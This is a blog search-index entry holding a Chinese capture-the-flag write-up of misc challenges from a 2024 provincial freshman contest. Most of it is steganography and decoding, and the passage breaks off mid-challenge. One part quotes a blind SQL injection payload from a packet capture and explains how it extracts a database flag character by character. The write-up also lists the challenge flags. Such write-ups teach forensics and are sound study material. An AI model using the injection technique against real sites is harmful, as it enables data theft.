<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>2024-GCTF(赣CTF)第二届江西省高校联合新生赛 Misc-wp</title>
    <link href="/2024/11/03/2024-JX-GCTF-xss-misc/"/>
    <url>/2024/11/03/2024-JX-GCTF-xss-misc/</url>
    
    <content type="html"><![CDATA[<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h4 id="0x01-checkin"><a href="#0x01-checkin" class="headerlink" title="0x01-checkin"></a>0x01-checkin</h4><p><img src="/../2024-JX-GCTF-xss-misc/image001.png"></p><p>对图片进行分析，使用hex</p><p><img src="/../2024-JX-GCTF-xss-misc/image003.png"><br>可以看到图片的末尾有一段十六进制显示是有区别的，这里可以考虑一下是编码不同的原因</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>lzltool.cn<span class="hljs-regexp">/Tools/</span>HexToUtf8<br></code></pre></td></tr></table></figure><p><img src="/../2024-JX-GCTF-xss-misc/image005.png"></p><p>这里根据jpg的文件 FF D9 识别，在复制后面的数据进行16进制转UTF-8</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">自由法治自由和谐平等自由自由公正法治友善平等法治法治法治平等平等友善敬业法治法治公正平等公正敬业平等友善敬业法治民主公正敬业平等友善敬业法治敬业法治平等公正平等平等友善敬业公正爱国公正民主公正友善敬业法治法治公正民主公正诚信自由文明民主文明民主文明民主法治友善法治<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">核心价值观编码  https:<span class="hljs-regexp">//</span>sym233.github.io<span class="hljs-regexp">/core-values-encoder/</span><br></code></pre></td></tr></table></figure><p><img src="/../2024-JX-GCTF-xss-misc/image007.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">GCTF&#123;wu_wei_qi_yue_haowan!!!&#125;<br></code></pre></td></tr></table></figure><h4 id="0x02-送分的Forensics-1"><a href="#0x02-送分的Forensics-1" class="headerlink" title="0x02-送分的Forensics 1"></a>0x02-送分的Forensics 1</h4><p><img src="/../2024-JX-GCTF-xss-misc/image009.png"></p><p>社工题，这类题目主要考察信息收集能力，对图片类型可以使用网上的一些识图工具</p><p>例如百度识图或者google</p><p><img src="/../2024-JX-GCTF-xss-misc/image011.png"></p><p>百度识图推测的地址为江心屿，但实际是个错误的地方，分析一下识别出来的内容</p><p><img src="/../2024-JX-GCTF-xss-misc/image013.png"></p><p><img src="/../2024-JX-GCTF-xss-misc/image015.png"></p><p><img src="/../2024-JX-GCTF-xss-misc/image017.png"></p><p><img src="/../2024-JX-GCTF-xss-misc/image019.png"></p><p>根据这篇文章的内容可以知道图片的地点为湘江，详细地点为纪念杜甫的遗迹，搜索一下</p><p><img src="/../2024-JX-GCTF-xss-misc/image021.png"></p><p>得到地点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">GCTF&#123;湖南省长沙市杜甫江阁&#125;<br></code></pre></td></tr></table></figure><h4 id="0x03-送分的Forensics-2"><a href="#0x03-送分的Forensics-2" class="headerlink" title="0x03-送分的Forensics 2"></a>0x03-送分的Forensics 2</h4><p><img src="/../2024-JX-GCTF-xss-misc/image023.png"></p><p>同样类型的题目，照着同样的操作即可</p><p><img src="/../2024-JX-GCTF-xss-misc/image025.png"></p><p>可以看到和题目中的一模一样，</p><p><img src="/../2024-JX-GCTF-xss-misc/image027.png"></p><p>搜索一下得到地点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">GCTF&#123;江西省新余市仙女湖&#125;<br></code></pre></td></tr></table></figure><h4 id="0x04-嘿嘿，真的是无畏契约呢"><a href="#0x04-嘿嘿，真的是无畏契约呢" class="headerlink" title="0x04-嘿嘿，真的是无畏契约呢"></a>0x04-嘿嘿，真的是无畏契约呢</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">iVBORw0KGgoAAAANSUhEUgAAAXIAAAFyCAIAAABnRsZeAAAHiElEQVR4nO3cwYrcRhRAUSn4/z/ZymKcMGShReoWVdVzDhibgW5p1O1LLR7v/v38vp77vp/ruZ7rvq/ruZ/7uZ77up77/vrZc13Xdd3P15/rea77up/7uq/rua77er7++vP3fT3Xff15yXN9vfz5/vPn61/PdV3XfV9fb/Hf9//39f9cBTjC/TzP6nsAPspfq28A+DSyAsRkBYjJChCTFSAmK0BMVoCYrAAxWQFisgLEZAWIyQoQkxUgJitATFaAmKwAMVkBYrICxGQFiMkKEJMVICYrQExWgJisADFZAWKyAsRkBYjJChCTFSAmK0BMVoCYrAAxWQFisgLEZAWIyQoQkxUgJitA7NeqC9/3verSkzzP879fO+9pvN/V+3Xn/Uar7uqd72TFaQWIyQoQkxUgJitATFaAmKwAMVkBYrICxGQFiC2bsn23ajrw3apZ2Hfvd7VqYvXdntO9737ad3KE0woQkxUgJitATFaAmKwAMVkBYrICxGQFiMkKENt0yvbdntOuI/b8jUbuatWkrE9wB04rQExWgJisADFZAWKyAsRkBYjJChCTFSAmK0DsyCnbE41Mjs6b4Nxzjnbea0+cWD2R0woQkxUgJitATFaAmKwAMVkBYrICxGQFiMkKEDNle7yRCd1V0718NqcVICYrQExWgJisADFZAWKyAsRkBYjJChCTFSB25JTtiRtJV82zjjyrVdtqV113xInfyXmcVoCYrAAxWQFisgLEZAWIyQoQkxUgJitATFaA2KZTtp+3RXXVTtl51503vzvvuiM+7zs5j9MKEJMVICYrQExWgJisADFZAWKyAsRkBYjJChBbNmX703Z/njhXeqJVu3v5zmkFiMkKEJMVICYrQExWgJisADFZAWKyAsRkBYgtm7Id2Qw6bxpy3r7SkXueN4O7arr386aK9/w+r+K0AsRkBYjJChCTFSAmK0BMVoCYrAAxWQFisgLE7lUTfiNzlqteu8qe9zxvInnEqm/Ou1XvvIrTChCTFSAmK0BMVoCYrAAxWQFisgLEZAWIyQoQW7bLdtV04LzNr/PMm9Ecue68d141C/tu1dM4kdMKEJMVICYrQExWgJisADFZAWKyAsRkBYjJChBbNmX7bt6s5IkbSVftOt1zW+0qP22D8ginFSAmK0BMVoCYrAAxWQFisgLEZAWIyQoQkxUgtumU7buRqcSRach5s5LmaL/bc4fuvOuO2HN+12kFiMkKEJMVICYrQExWgJisADFZAWKyAsRkBYgdOWU7Ys+Ns/N83u87ct1VT+PzJqHfOa0AMVkBYrICxGQFiMkKEJMVICYrQExWgJisALF71bbLVbOD8yZHT9xXuuenMOLztgKv+h86wmkFiMkKEJMVICYrQExWgJisADFZAWKyAsRkBYgt22W752bQEydlR647Yt688qqNsydO6K76Xr1zWgFisgLEZAWIyQoQkxUgJitATFaAmKwAMVkBYsumbOdZNd85Ys+dsiMzqfOmqE/cGnviPY9wWgFisgLEZAWIyQoQkxUgJitATFaAmKwAMVkBYveqKb1Vc6XvTnwaJ97zPKt2yr77vLnhd04rQExWgJisADFZAWKyAsRkBYjJChCTFSAmK0DsyF2282YW5027rtreuucs7LsTZ1Ln7f0due4qTitATFaAmKwAMVkBYrICxGQFiMkKEJMVICYrQGzTXbarJlbnPY1V05DzJjhPfM6f973ak9MKEJMVICYrQExWgJisADFZAWKyAsRkBYjJChA7cpftuz33hp44v7tqw+6em33nPec9t/OOcFoBYrICxGQFiMkKEJMVICYrQExWgJisADFZAWLLdtn+NKsmdOddd9Wk7J47ZfecwF7FaQWIyQoQkxUgJitATFaAmKwAMVkBYrICxGQFiC3bZTtvf+cqI7OS8yZHR955zx2rq3bKrprQPXEG12kFiMkKEJMVICYrQExWgJisADFZAWKyAsRkBYgtm7J9t+dk4arJ4D132Y5cd96m2xHzvnUnfoIjnFaAmKwAMVkBYrICxGQFiMkKEJMVICYrQExWgNimU7bv9tyxOu+d99z7u+ddvVt1z6u2Ea/itALEZAWIyQoQkxUgJitATFaAmKwAMVkBYrICxI6csv08J+4rHbHnptt5T/L9nkeexp6cVoCYrAAxWQFisgLEZAWIyQoQkxUgJitATFaAmCnbLYzMlf60Cd159twLe+IMrtMKEJMVICYrQExWgJisADFZAWKyAsRkBYjJChA7csp2z8nCd/NmYVdNYa66q1UbZ0eu+3mf/junFSAmK0BMVoCYrAAxWQFisgLEZAWIyQoQkxUgtumU7Z5bRVfZ82mMzHeueu2IPT+FPSfOnVaAmKwAMVkBYrICxGQFiMkKEJMVICYrQExWgNi955QecC6nFSAmK0BMVoCYrAAxWQFisgLEZAWIyQoQkxUgJitATFaAmKwAMVkBYrICxGQFiMkKEJMVICYrQExWgJisADFZAWKyAsRkBYjJChCTFSAmK0BMVoCYrAAxWQFisgLEZAWIyQoQkxUgJitATFaAmKwAMVkBYrICxGQFiP0NIdMzLuV40U8AAAAASUVORK5CYII=<br></code></pre></td></tr></table></figure><p>CyberChef</p><p>解码得到图片数据，再转换得到一张二维码</p><p><img src="/../2024-JX-GCTF-xss-misc/image029.png"></p><p>扫描发现是wuweiqiyue的官网，那就导出这张二维码分析png图片里的数据</p><p><img src="/../2024-JX-GCTF-xss-misc/image031.png"></p><p>并没有发现内容，这时候思考一下png图片的一些像素隐写，使用<strong>zsteg</strong>工具检测一下png图片中的lsb数据</p><p><img src="/../2024-JX-GCTF-xss-misc/image033.png"></p><p><img src="/../2024-JX-GCTF-xss-misc/image035.png"></p><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">GCTF&#123;wa_zh3nd3h@owan&#125;<br></code></pre></td></tr></table></figure><h4 id="0x05-真的是basc64哦"><a href="#0x05-真的是basc64哦" class="headerlink" title="0x05-真的是basc64哦"></a>0x05-真的是basc64哦</h4><p><img src="/../2024-JX-GCTF-xss-misc/image037.png"></p><p>看文件的内容，很明显的base64隐写</p><p><img src="/../2024-JX-GCTF-xss-misc/image039.png"></p><p>网上脚本也很多</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs plain">import base64 <br>path = &#x27;4nums.txt&#x27;  #将需要解密的内容填入文本文件<br>file = open(path,encoding=&#x27;utf-8&#x27;)<br>a = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;<br>aaa = &#x27;&#x27;<br>while True:<br>    text = file.readline()  # 只读取一行内容<br>    # 判断是否读取到内容<br>    text = text.replace(&quot;\n&quot;, &quot;&quot;)<br>    if not text:<br>        break<br>    if text.count(&#x27;=&#x27;) == 1:<br>        aaa = aaa + \<br>            str(&#x27;&#123;:02b&#125;&#x27;.format((a.find(text[len(text)-2])) % 4))<br>    if text.count(&#x27;=&#x27;) == 2:<br>        aaa = aaa + \<br>            str(&#x27;&#123;:04b&#125;&#x27;.format((a.find(text[len(text)-3])) % 16))<br>file.close()<br>t = &quot;&quot;<br>ttt = len(aaa)<br>ttt = ttt//8*8<br>for i in range(0,ttt,8):<br>    t = t + chr(int( aaa[i:i+8],2))<br>print(t)<br></code></pre></td></tr></table></figure><p><img src="/../2024-JX-GCTF-xss-misc/image041.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">GCTF&#123;you_kn0w_base_sixsix_four&#125;<br></code></pre></td></tr></table></figure><h4 id="0x06-ez-流量"><a href="#0x06-ez-流量" class="headerlink" title="0x06-ez_流量"></a>0x06-ez_流量</h4><p><img src="/../2024-JX-GCTF-xss-misc/image043.png"></p><p>观察流量包特征，发现又sql注入的痕迹</p><p>过滤http流量，只筛选GET包</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">http contains <span class="hljs-string">&quot;<span class="hljs-keyword">GET</span>&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/../2024-JX-GCTF-xss-misc/image045.png"></p><p>导出分组解析结果为CSV</p><p><img src="/../2024-JX-GCTF-xss-misc/image047.png"></p><p><img src="/../2024-JX-GCTF-xss-misc/image049.png"></p><p>去掉其他数据，对注入数据进行分析得出结论，注入方式为布尔盲注，何为布尔盲注</p><p>substr函数原理</p><p>在构造SQL语句之时，and后面如果跟着一个大于0的数，那么SQL语句正确执行，所以利用此特性，使用substr截取字符，当截取的字符不存在，再通过asci函数处理之后将会变成false，页面将回显错误</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">SELECT*from users WHERE id = l and ascii(substr(database(),8,1))<br><br>substr 返回子字符串<br>8是当前数据库&#x27;security&#x27;的长度 ，从第8个开始，取1位，则是&#x27;r&#x27;<br>如果pos为9 那么开始位置大于字符串长度，ascii函数处理后将变成false<br>and 后只要不为 0，页面都会返回正常<br></code></pre></td></tr></table></figure><p>此处为求数据库的名，根据这个原理分析一下过滤出来的注入数据信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plain">GET /ctf/Less-5/?id=1%20and%20ascii(substr((select%20flag%20from%20t),1,1))=33--+ HTTP/1.1<br>#取出关键注入数据<br><br>?id=1%20and%20ascii(substr((select%20flag%20from%20t),1,1))=33<br><br>判断注入<br><br>ascii()函数用于获取一个字符的 ASCII 码值。整个这部分的意思是，获取 flag 字符串的第一个字符的 ASCII 码值，并与 33 进行比较。攻击者通过不断修改这个比较的值（例如从 33 开始逐步尝试不同的 ASCII 码值），根据数据库返回的结果（如果条件满足返回相应数据行，不满足则可能返回空结果或错误提示等不同情况，取决于具体数据库和应用程序设置）来判断猜测的字符是否正确。如果数据库执行这个注入语句后返回了预期的结果（比如符合前面正常查询条件 id = 1 且这个字符比较条件也满足的数据行），那么就说明猜测的这个字符的 ASCII 码值是正确的，进而可以继续猜测下一个字符，通过不断重复这个过程，理论上就可以逐步还原出整个 flag 字符串。<br><br>使用substr返回在名为t表的flag值,这里的1,1则是查询得到的 flag 字符串结果中，截取从第 1 个字符开始，长度为 1 的子字符串，也就是只获取 flag 字符串的第一个字符。通过这种方式，攻击者可以逐个字符地去猜测 flag 的内容<br></code></pre></td></tr></table></figure><p>了解了原理就可以很清楚的明白，每个切片返回的ascii值就是读取到的正确字符</p><p><img src="/../2024-JX-GCTF-xss-misc/image051.png"></p><p>这里的  1,1 变为  2,1 说明上一个ascii为正确的值，</p><p>以此类推得到全部的ascii值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">102 108 97 103 123 119 49 114 101  115 104 65 82 75 95 101 122 95 49 115 110 116 105 116 125 126 126 126 126<br></code></pre></td></tr></table></figure><p>转换一下数据</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.lzltool.cn<span class="hljs-regexp">/Tools/</span>AsciiToText<br></code></pre></td></tr></table></figure><p><img src="/../2024-JX-GCTF-xss-misc/image053.png"></p><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">flag&#123;w1reshARK_ez_1sntit&#125;<br></code></pre></td></tr></table></figure><h4 id="0x07-ez-forensics"><a href="#0x07-ez-forensics" class="headerlink" title="0x07-ez_forensics"></a>0x07-ez_forensics</h4><p><img src="/../2024-JX-GCTF-xss-misc/image055.png"></p><p>一张图片跟一个加密的文件</p><p><img src="/../2024-JX-GCTF-xss-misc/image057.png"></p><p>图片为纯白，分析数据并没有内容</p><p>再仔细观察图片可以发现在左上角有一点不同的像素，可以想到像素隐写，使用zsteg工具跑一下</p><p><img src="/../2024-JX-GCTF-xss-misc/image059.png"></p><p>可以发现无法检测到隐写内容，这时候可以使用 –all  参数对图片文件使用所有的方法进行检测</p><p><img src="/../2024-JX-GCTF-xss-misc/image061.png"></p><p>成功得到key信息</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">key: y<span class="hljs-number">0</span>u_c<span class="hljs-number">4</span><span class="hljs-symbol">n_n3</span>v<span class="hljs-number">3</span>r_k<span class="hljs-symbol">n0</span>w_<span class="hljs-number">7</span>h<span class="hljs-number">3</span>_k<span class="hljs-number">3</span>y<br></code></pre></td></tr></table></figure><p>得到key后，再看到另一个加密文件，结合题目名可以想到内存取证需要使用到key的软件</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">VeraCrypt</span><br></code></pre></td></tr></table></figure><p><img src="/../2024-JX-GCTF-xss-misc/image063.png"></p><p><img src="/../2024-JX-GCTF-xss-misc/image065.png"></p><p>输入从图片中得到的key</p><p><img src="/../2024-JX-GCTF-xss-misc/image067.png"></p><p>加载完成后再资源管理器中找到我们挂载的盘符，得到flag</p><p><img src="/../2024-JX-GCTF-xss-misc/image069.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">GCTF&#123;f0r3n51c5_4nd_158_15_34zy&#125;<br></code></pre></td></tr></table></figure><h4 id="0x09-ez-word"><a href="#0x09-ez-word" class="headerlink" title="0x09-ez_word"></a>0x09-ez_word</h4><p><img src="/../2024-JX-GCTF-xss-misc/image073.png"></p><p>word文件，拿到文件的时候可以想想这种类型的文件有什么隐写方式，</p><p>一些看不见的字符我们可以直接全选文档然后将字体颜色设置为红色</p><p><img src="/../2024-JX-GCTF-xss-misc/image075.png"></p><p><img src="/../2024-JX-GCTF-xss-misc/image077.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">Flag1=GCTF&#123;welc33me_<br></code></pre></td></tr></table></figure><p>复制不出来直接右键搜索即可</p><p><img src="/../2024-JX-GCTF-xss-misc/image079.png"></p><p>点开文件对隐藏图片显示进行设置，找到账户下的选项</p><p><img src="/../2024-JX-GCTF-xss-misc/image081.png"></p><p>打开显示隐藏文字，得到图片</p><p><img src="/../2024-JX-GCTF-xss-misc/image083.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">Flag2=w0rd@_<br></code></pre></td></tr></table></figure><p>接着去分析word文件的数据</p><p><img src="/../2024-JX-GCTF-xss-misc/image085.png"></p><p>word文件的底部发现有个压缩包，另存一下压缩包文件</p><p><img src="/../2024-JX-GCTF-xss-misc/image087.png"></p><p><img src="/../2024-JX-GCTF-xss-misc/image089.png"></p><p>base100加密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">🐝🐚🐮🐯🐲🐝🐚🐨🐩🐩🐲🐝🐚🐨🐧🐫🐲🐝🐚🐨🐨🐰🐲🐝🐚🐮🐮🐲🐝🐚🐨🐨🐧🐲🐝🐚🐭🐭🐲🐝🐚🐰🐧🐲🐝🐚🐰🐮🐲🐝🐚🐭🐰🐲🐝🐚🐨🐩🐧🐲🐝🐚🐬🐩🐲🐝🐚🐯🐨🐲🐝🐚🐨🐩🐩🐲🐝🐚🐯🐩🐲🐝🐚🐮🐧🐲🐝🐚🐰🐯🐲🐝🐚🐨🐨🐧🐲🐝🐚🐭🐬🐲🐝🐚🐭🐨🐲<br></code></pre></td></tr></table></figure><p><img src="/../2024-JX-GCTF-xss-misc/image091.png"></p><p>解码得到unicode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&amp;#78;&amp;#122;&amp;#104;&amp;#119;&amp;#77;&amp;#110;&amp;#66;&amp;#90;&amp;#97;&amp;#69;&amp;#120;&amp;#52;&amp;#81;&amp;#122;&amp;#82;&amp;#70;&amp;#98;&amp;#110;&amp;#65;&amp;#61;<br></code></pre></td></tr></table></figure><p><img src="/../2024-JX-GCTF-xss-misc/image093.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">NzhwMnBZaEx4QzRFbnA=<br></code></pre></td></tr></table></figure><p><img src="/../2024-JX-GCTF-xss-misc/image095.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">78p2pYhLxC4Enp<br></code></pre></td></tr></table></figure><p><img src="/../2024-JX-GCTF-xss-misc/image097.png"></p><p>这里推荐一个解码工具</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">ToolsFx</span><br><span class="hljs-selector-attr">[GitHub - Leon406/ToolsFx: 基于kotlin+tornadoFx的跨平台密码学工具箱.包含编解码,编码转换,加解密, 哈希,MAC,签名,大数运算,压缩,二维码功能,ctf等实用功能,支持插件]</span>(<span class="hljs-attribute">https</span>:<span class="hljs-comment">//github.com/Leon406/ToolsFx)</span><br></code></pre></td></tr></table></figure><p><img src="/../2024-JX-GCTF-xss-misc/image099.png"></p><p><strong>可以直接梭哈出结果，但是不得不提一嘴，工具是为了更便捷的做题目，新手ctfer还是要去了解一下各种编码的原理，只有懂了原理才能成为真正的ctfer糕手。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">Flag3=m1ssccc$$&#125;<br>GCTF&#123;welc33me_w0rd@_m1ssccc$$&#125;<br></code></pre></td></tr></table></figure><h4 id="0x10-爱玩原神？"><a href="#0x10-爱玩原神？" class="headerlink" title="0x10-爱玩原神？"></a>0x10-爱玩原神？</h4><p><img src="/../2024-JX-GCTF-xss-misc/image101.png"></p><p>题目只有一张图片，这时候可以分析一下文件数据</p><p><img src="/../2024-JX-GCTF-xss-misc/image103.png"></p><p>可以看到jpg图片的尾部还有一个压缩包，搜索jpg的文件尾将PK（504B）开头的内容另存为一个新文件，</p><p><img src="/../2024-JX-GCTF-xss-misc/image105.png"></p><p>拿到隐藏的压缩包，压缩包中有个文本文件但是压缩包是加密的，这时候需要再jpg图片中继续寻找压缩包的密码</p><p>jpg的隐写，试过其他的之后，尝试到隐形水印的时候有了结果</p><p><img src="/../2024-JX-GCTF-xss-misc/image107.png"></p><p><img src="/../2024-JX-GCTF-xss-misc/image109.png"></p><p>得到密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">zhendemisiwole!!!!#!<br></code></pre></td></tr></table></figure><p>盲水印的原理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">盲水印是一种肉眼不可见的水印方式，对图片资源使用图片盲水印或者文字水印，借此避免数字媒体未经授权的复制和拷贝，可通过对原图进行解码操作，得到水印图来证明版权归属。<br>这类盲水印是怎样实现的呢？原理并不复杂，通常是将图片进行离散余弦、小波或者傅里叶变换，得到图片的频谱信息，再将水印的编码信息叠加到图片的频谱上，然后再进行一次逆变换，生成的图片就带有几乎无法检测、但又可以确切还原出来的盲水印了。<br></code></pre></td></tr></table></figure><p>题目的盲水印无需原图即可还原也可以称为单图盲水印</p><p>使用得到的密码解压压缩包得到文本文件的内容</p><p><img src="/../2024-JX-GCTF-xss-misc/image111.png"></p><p>很明显的逆序，这里的文本文件里的内容已经显示出来了将编码逆序即可</p><p><img src="/../2024-JX-GCTF-xss-misc/image113.png"></p><p>附上一个逆序的脚本，恢复压缩包还是无法解压的，因为数据内容只是像压缩包其实并不是压缩包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">a = open(&#x27;ys.zip&#x27;,&#x27;rb&#x27;)<br>b = open(&#x27;ysqd.zip&#x27;,&#x27;wb&#x27;)<br>b = b.write(a.read()[::-1])  #把读取到的数据：：-1即可<br></code></pre></td></tr></table></figure><p><img src="/../2024-JX-GCTF-xss-misc/image115.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">GCTF&#123;yu@nsh3n_qid0ng_qidong!!!&#125;<br></code></pre></td></tr></table></figure><h4 id="0x11-坚持不懈的压缩"><a href="#0x11-坚持不懈的压缩" class="headerlink" title="0x11-坚持不懈的压缩"></a>0x11-坚持不懈的压缩</h4><p><img src="/../2024-JX-GCTF-xss-misc/image117.png"></p><p>解压压缩包得到password文本文件和一个加密的压缩包</p><p>先看到passwd文件里的内容</p><p><img src="/../2024-JX-GCTF-xss-misc/image119.png"></p><p>俩个等号，这时候就已经想到base64编码了，应该是换码表了，所以看起来和正常的base64有些不一样</p><p>使用<strong>CyberChef</strong>进行解码的操作</p><p><img src="/../2024-JX-GCTF-xss-misc/image121.png"></p><p>得到密码，再用密码去解压加密的压缩包，发现可以成功解压</p><p><img src="/../2024-JX-GCTF-xss-misc/image123.png"></p><p>下一层同理，也能使用密码进行解压</p><p>典型的压缩包套娃，解压一千次就能得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs plain">import os<br>import zipfile<br><br><br>def recursive_unzip(zip_file_path, password):<br>    with zipfile.ZipFile(zip_file_path, &#x27;r&#x27;) as zip_ref:<br>        try:<br>            zip_ref.extractall(pwd=password.encode(&#x27;utf-8&#x27;))<br>        except RuntimeError as e:<br>            print(f&quot;解压 &#123;zip_file_path&#125; 时出错: &#123;e&#125;&quot;)<br>            return<br><br>    base_folder = os.path.splitext(zip_file_path)[0]<br><br>    for root, dirs, files in os.walk(base_folder):<br>        for file in files:<br>            file_path = os.path.join(root, file)<br>            if file_path.endswith(&#x27;.zip&#x27;):<br>                recursive_unzip(file_path, password)<br><br><br>if __name__ == &quot;__main__&quot;:<br>    password = &quot;GCTF_yeyeyeye&quot;<br>    zip_file_names = []<br>    for i in range(998, 0, -1):   #此处998需要修改为同目录下压缩包的名字，比如我是997就需要改为997<br>        zip_file_names.append(f&quot;temp_&#123;i&#125;.zip&quot;)<br><br>    for zip_file_name in zip_file_names:<br>        recursive_unzip(zip_file_name, password)<br></code></pre></td></tr></table></figure><p>比较懒，就优化一下，能用就行，</p><p><img src="/../2024-JX-GCTF-xss-misc/image125.png"></p><p>找到temp_0</p><p><img src="/../2024-JX-GCTF-xss-misc/image127.png"></p><p>输入密码得到flag文件</p><p><img src="/../2024-JX-GCTF-xss-misc/image129.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">GCTF&#123;the_final_is_me_hahaha!!!&#125;<br></code></pre></td></tr></table></figure><h4 id="0x12-可惜雪飘进了双眼"><a href="#0x12-可惜雪飘进了双眼" class="headerlink" title="0x12-可惜雪飘进了双眼"></a>0x12-可惜雪飘进了双眼</h4><p><img src="/../2024-JX-GCTF-xss-misc/image131.png"></p><p>打开文本文件可以，发现里面有字符但是看不见，可以想到应该是whitespace</p><p>white_space是一种编程语言<br>由”空格”，”回车”，”tab”组成</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[Whitelips the Esoteric Language IDE]</span>(<span class="hljs-attribute">https</span>:<span class="hljs-comment">//vii5ard.github.io/whitespace/)</span><br></code></pre></td></tr></table></figure><p><img src="/../2024-JX-GCTF-xss-misc/image133.png"></p><p><img src="/../2024-JX-GCTF-xss-misc/image135.png"></p><p>没有内容输出，那就只能看到给的key文件了</p><p><img 